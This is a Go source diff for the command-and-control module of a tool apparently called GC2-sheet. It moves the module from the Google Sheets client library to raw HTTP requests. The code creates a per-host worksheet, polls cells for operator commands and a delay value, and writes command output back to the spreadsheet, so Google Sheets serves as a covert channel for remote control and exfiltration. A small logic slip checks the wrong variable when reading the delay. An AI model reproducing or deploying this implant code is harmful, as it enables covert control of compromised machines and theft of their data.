@@ -3,21 +3,52 @@ package C2
 import (
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
+	"encoding/json"
 	"fmt"
+	"net/http"
 	"strconv"
-
-	"google.golang.org/api/sheets/v4"
+	"strings"
 )
 
 type GoogleCommandExecutor struct {
-	connector       *sheets.Service
+	client          *http.Client
 	googleSheetID   string
 	googleSheetName string
 }
 
+const sheetCommandCell = "A"
+const sheetOutputStartCell = "B"
+const sheetOutputEndCell = "C"
+const sheetTickerCell = "E2"
+
+type BatchUpdate struct {
+	Requests                     []Request `json:"requests"`
+	IncludeSpreadsheetInResponse bool      `json:"includeSpreadsheetInResponse"`
+}
+
+type Request struct {
+	AddSheet AddSheetRequest `json:"addSheet"`
+}
+
+type AddSheetRequest struct {
+	Properties SheetProperties `json:"properties"`
+}
+
+type SheetProperties struct {
+	Title string `json:"title"`
+}
+
+type ValueRange struct {
+	Range  string          `json:"range"`
+	Values [][]interface{} `json:"values"`
+}
+
+var ErrorUnableToCreateGoogleSpreadsheet = fmt.Errorf("an error occurred while creating Google spreadsheet")
+var ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration = fmt.Errorf("an error occurred while creating default Google spreadsheet configuration")
+
 func NewGoogleCommandExecutor(connector *GoogleConnector) (*GoogleCommandExecutor, error) {
 	googleCommandExecutor := &GoogleCommandExecutor{
-		connector:       &connector.googleSheetConnector,
+		client:          connector.client,
 		googleSheetID:   configuration.GetOptionsGoogleSheetID(),
 		googleSheetName: utils.GetUniqueHostnameName(),
 	}
@@ -30,68 +61,80 @@ func NewGoogleCommandExecutor(connector *GoogleConnector) (*GoogleCommandExecuto
 	return googleCommandExecutor, nil
 }
 
-var ErrorUnableToCreateGoogleSpreadsheet = fmt.Errorf("an error occurred while creating Google spreadsheet")
-var ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration = fmt.Errorf(
-	"an error occurred while creating default Google spreadsheet configuration",
-)
-
-const sheetCommandCell = "A"
-const sheetOutputStartCell = "B"
-const sheetOutputEndCell = "C"
-const sheetTickerCell = "E2"
-
 func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
 	sheetName := commandExecutor.googleSheetName
-
-	var requests []*sheets.Request
-
-	request := &sheets.Request{}
-	addSheetRequest := &sheets.AddSheetRequest{}
-	sheetProperties := &sheets.SheetProperties{Title: sheetName}
-
-	addSheetRequest.Properties = sheetProperties
-	request.AddSheet = addSheetRequest
-	requests = append(requests, request)
-
-	batchUpdateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}
-
-	responseBatchUpdate, err := commandExecutor.connector.Spreadsheets.BatchUpdate(
+	url := fmt.Sprintf(
+		"https://sheets.googleapis.com/v4/spreadsheets/%s:batchUpdate",
 		commandExecutor.googleSheetID,
-		batchUpdateSpreadSheetRequest,
-	).Do()
+	)
+
+	var body []byte
+
+	request := Request{
+		AddSheet: AddSheetRequest{
+			Properties: SheetProperties{
+				Title: sheetName,
+			},
+		},
+	}
+	batchUpdate := BatchUpdate{
+		Requests:                     []Request{request},
+		IncludeSpreadsheetInResponse: false,
+	}
+
+	body, err := json.Marshal(batchUpdate)
 	if err != nil {
-		return err
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
 	}
 
-	if responseBatchUpdate == nil {
-		return ErrorUnableToCreateGoogleSpreadsheet
+	req, err := http.NewRequest("POST", url, strings.NewReader(string(body)))
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
 	}
 
-	writeRange := fmt.Sprintf("%s!D2:%s", sheetName, sheetTickerCell)
-	writeData := [][]interface{}{{"Delay configuration (sec)", DefaultTickerDuration}}
-
-	var valueRange = &sheets.ValueRange{
-		Range:  writeRange,
-		Values: writeData,
+	_, err = commandExecutor.client.Do(req)
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
 	}
 
-	responseValueUpdate, err := commandExecutor.connector.Spreadsheets.Values.Update(
+	// Adding ticker cells values
+	tickerRange := fmt.Sprintf("%s!D2:%s", sheetName, sheetTickerCell)
+
+	url = fmt.Sprintf(
+		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s?valueInputOption=RAW",
 		commandExecutor.googleSheetID,
-		writeRange,
-		valueRange,
-	).ValueInputOption("RAW").Do()
+		tickerRange,
+	)
+
+	var output [][]interface{}
+	output = append(output, make([]interface{}, 2))
+
+	output[0][0] = "Delay configuration (sec)"
+	output[0][1] = DefaultTickerDuration
+
+	valueRange := ValueRange{
+		Range:  tickerRange,
+		Values: output,
+	}
+
+	body, err = json.Marshal(valueRange)
 	if err != nil {
-		return err
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
 	}
 
-	if responseValueUpdate == nil {
-		return ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration
+	req, err = http.NewRequest("PUT", url, strings.NewReader(string(body)))
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
 	}
+	_, err = commandExecutor.client.Do(req)
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
+	}
+	return err
 
-	utils.LogDebug("[+] Sheet successfully created: " + sheetName)
-	return nil
 }
 
+// TODO: merge two requests
 func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int, error) {
 	var commandResult string
 	var tickerDelayResult int
@@ -100,27 +143,62 @@ func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int,
 	// Example: Sheet1!A2
 	readRange := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)
 
-	resp, err := g.connector.Spreadsheets.Values.Get(g.googleSheetID, readRange).Do()
+	url := fmt.Sprintf(
+		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
+		g.googleSheetID,
+		readRange,
+	)
+
+	request, err := http.NewRequest("GET", url, nil)
+
 	if err != nil {
 		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
 	}
 
-	if len(resp.Values) != 0 {
-		// Get result
-		commandResult = resp.Values[0][0].(string)
+	resp, err := g.client.Do(request)
+	if err != nil {
+		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+	}
+
+	var valueRange ValueRange
+	err = json.NewDecoder(resp.Body).Decode(&valueRange)
+	if err != nil {
+		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+	}
+
+	if valueRange.Values != nil {
+		commandResult = valueRange.Values[0][0].(string)
 	} else {
 		commandResult = ""
 	}
 
-	// TODO: We should merge this call with the previous one
+	// Ticker download
 	readRange = fmt.Sprintf("%s!%s", g.googleSheetName, sheetTickerCell)
-	resp, err = g.connector.Spreadsheets.Values.Get(g.googleSheetID, readRange).Do()
+	url = fmt.Sprintf(
+		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
+		g.googleSheetID,
+		readRange,
+	)
+
+	request, err = http.NewRequest("GET", url, nil)
+
 	if err != nil {
 		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
 	}
 
-	if len(resp.Values) != 0 {
-		tickerDelayResult, err = strconv.Atoi(resp.Values[0][0].(string))
+	resp, err = g.client.Do(request)
+	if err != nil {
+		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+	}
+
+	var item ValueRange
+	err = json.NewDecoder(resp.Body).Decode(&item)
+	if err != nil {
+		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
+	}
+
+	if valueRange.Values != nil {
+		tickerDelayResult, err = strconv.Atoi(item.Values[0][0].(string))
 		if err != nil {
 			tickerDelayResult = 0
 			err = fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
@@ -129,7 +207,8 @@ func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int,
 		tickerDelayResult = 0
 	}
 
-	return commandResult, tickerDelayResult, err
+	return commandResult, tickerDelayResult, nil
+
 }
 
 func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) error {
@@ -143,23 +222,41 @@ func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) e
 		rowId,
 	)
 
+	url := fmt.Sprintf(
+		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s?valueInputOption=RAW",
+		g.googleSheetID,
+		sheetRange,
+	)
+
 	var output [][]interface{}
 	output = append(output, make([]interface{}, 2))
 
 	output[0][0] = commandOutput
 	output[0][1] = utils.GetCurrentDate()
 
-	valueRange := &sheets.ValueRange{
+	valueRange := ValueRange{
 		Range:  sheetRange,
 		Values: output,
 	}
 
-	valueInputOption := "RAW"
-	updateCell := g.connector.Spreadsheets.Values.Update(g.googleSheetID, sheetRange, valueRange)
-	_, err := updateCell.ValueInputOption(valueInputOption).Do()
+	var body []byte
+
+	body, err := json.Marshal(valueRange)
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
+	}
+
+	req, err := http.NewRequest("PUT", url, strings.NewReader(string(body)))
+
+	if err != nil {
+		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
+	}
+
+	_, err = g.client.Do(req)
 	if err != nil {
 		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
 	}
 
 	return nil
+
 }
